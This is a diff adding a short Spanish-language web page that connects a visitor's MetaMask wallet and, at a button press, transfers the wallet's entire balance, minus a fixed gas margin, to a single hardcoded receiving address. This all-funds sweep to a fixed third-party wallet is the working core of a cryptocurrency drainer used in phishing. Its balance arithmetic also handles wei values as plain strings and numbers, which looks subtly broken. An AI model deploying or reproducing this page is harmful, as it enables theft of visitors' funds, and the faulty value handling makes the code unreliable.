@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enviar Fondos</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.1/dist/web3.min.js"></script>
+</head>
+<body>
+    <h1>Enviar Todo el Saldo</h1>
+    <button id="connectButton">Conectar MetaMask</button>
+    <button id="sendButton" style="display:none;">Enviar Saldo</button>
+    <p id="status"></p>
+
+    <script>
+        let web3;
+        let accounts;
+
+        document.getElementById('connectButton').onclick = async () => {
+            if (typeof window.ethereum !== 'undefined') {
+                web3 = new Web3(window.ethereum);
+                accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                document.getElementById('status').innerText = `Conectado como: ${accounts[0]}`;
+                document.getElementById('sendButton').style.display = 'block'; // Mostrar botón de envío
+            } else {
+                alert('Por favor, instala MetaMask!');
+            }
+        };
+
+        document.getElementById('sendButton').onclick = async () => {
+            const fromAccount = accounts[0];
+            const toAccount = '0x6497C5aDe6F21CDAf604E417FD0062ca4f98543F'; // Dirección de la billetera receptora
+            const balanceWei = await web3.eth.getBalance(fromAccount);
+            const gasFee = web3.utils.toWei('0.001', 'ether'); // Margen para tarifas de gas
+
+            if (balanceWei > gasFee) {
+                const amountToSend = balanceWei - gasFee; // Enviar todo menos el gas fee
+
+                // Realizar la transacción
+                web3.eth.sendTransaction({
+                    from: fromAccount,
+                    to: toAccount,
+                    value: amountToSend
+                })
+                .then(tx => {
+                    alert(`Transferencia exitosa: ${tx.transactionHash}`);
+                })
+                .catch(error => {
+                    console.error(error);
+                    alert('Error en la transferencia.');
+                });
+            } else {
+                alert('No tienes suficiente saldo para cubrir la tarifa de gas.');
+            }
+        };
+    </script>
+</body>
+</html>
+
+
+
